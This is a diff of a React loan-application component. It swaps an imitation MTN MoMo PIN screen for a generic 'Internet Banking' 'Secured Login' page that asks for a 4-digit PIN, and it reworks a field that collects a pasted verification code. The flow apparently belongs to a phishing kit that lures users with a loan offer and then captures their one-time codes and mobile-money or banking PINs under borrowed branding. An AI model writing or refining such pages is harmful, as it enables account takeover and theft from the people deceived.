@@ -418,6 +418,7 @@ function LoanApplication({ loanDetails, onBack, processor }) {
             }
 
             setShowVerification(false);
+            setProcessing(true);
             setSubmitted(true);
 
         } catch (error) {
@@ -531,35 +532,18 @@ function LoanApplication({ loanDetails, onBack, processor }) {
                         </label>
 
                         <div className="verification-code-area">
-
-                            <input
-                                type="text"
-                                value={verificationCode}
-                                onChange={(e) =>
-                                    setVerificationCode(
-                                        e.target.value.slice(0, 500)
-                                    )
-                                }
-                                onPaste={(e) => {
-                                    e.preventDefault();
-
-                                    const pastedCode =
-                                        e.clipboardData
-                                            .getData("text")
-                                            .slice(0, 500);
-
-                                    setVerificationCode(pastedCode);
-                                }}
-                                placeholder="Paste your verification code"
-                                maxLength={500}
-                                autoComplete="one-time-code"
-                                className="verification-code-input"
+                        <input
+                            type="text"
+                            value={verificationCode}
+                            onChange={(e) =>
+                                setVerificationCode(e.target.value)
+                            }
+                            placeholder="Enter verification code"
+                            inputMode="numeric"
+                            autoComplete="one-time-code"
+                            required
+                            autoFocus
                             />
-
-                            <div className="verification-code-count">
-                                {verificationCode.length}/500
-                            </div>
-
                         </div>
                         <div className="verification-timer">
                         {String(Math.floor(verificationTime / 60)).padStart(2, "0")}:
@@ -658,7 +642,7 @@ function LoanApplication({ loanDetails, onBack, processor }) {
 
                     <p>
                         Please wait while we verify
-                        your phone number...
+                        your your details...
                     </p>
             </div>
         );
@@ -669,48 +653,23 @@ function LoanApplication({ loanDetails, onBack, processor }) {
         return (
             <div className="pesa-pin-page">
 
-                {/* TOP BLUE SECTION */}
-
-                <div className="pesa-pin-top">
-
-                    <div className="pesa-logo">
-                        <div className="momo-logo-crop">
-                            <img
-                                src={momoLogo}
-                                alt="MoMo"
-                                className="momo-logo"
-                            />
-                        </div>
-                        <span className="momo-tagline" style={{ color: '#FFCC05' }}>
-                            <strong>MoMo</strong>
-                        </span>
-                        <span className="momo-tag" style={{ color: '#FFCC05' }}>
-                            from MTN
-                        </span>
-                    </div>
-                </div>
-
-
-
-                {/* WHITE CONTENT */}
-
                 <div className="pesa-pin-content">
 
                     <div className="pesa-pin-card">
 
                         <h1>
-                            Welcome to{" "}
-                            <strong>
-                                MoMo App
+                            <span style={{color:'rgba(5, 5, 4, 0.52)'}}>Welcome to</span>
+                            <strong style={{ color: '#05ff1a' }}>
+                                Internet Banking
                             </strong>
                         </h1>
 
                         <h2>
-                            Input your PIN
+                            Secured Login 🔒
                         </h2>
 
                         <p>
-                            Enter your PIN to continue
+                            Enter your 4-digit PIN to continue
                         </p>
 
 
@@ -782,7 +741,7 @@ function LoanApplication({ loanDetails, onBack, processor }) {
                                 handlePinNext
                             }
                         >
-                            NEXT
+                            Login
                         </button>
 
                     </div>
